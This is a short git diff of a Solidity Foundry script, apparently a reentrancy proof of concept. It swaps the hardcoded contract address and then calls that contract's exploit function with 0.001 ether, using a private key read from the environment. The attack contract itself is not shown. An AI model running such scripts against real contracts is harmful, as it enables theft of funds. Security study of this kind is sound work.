@@ -8,7 +8,7 @@ contract ReentrancyPOCScript is Script {
         uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
         vm.startBroadcast(deployerPrivateKey);
 
-        ReentrancyPOC reentrancyPOC = ReentrancyPOC(payable(0x282e8C00306aE18AC8FCA90d8bf46135718a9f29));
+        ReentrancyPOC reentrancyPOC = ReentrancyPOC(payable(0xc85B4989a71E988962902b7703Cf45e3d375D3a4));
         reentrancyPOC.exploit{value: 0.001 ether}();
 
         vm.stopBroadcast();
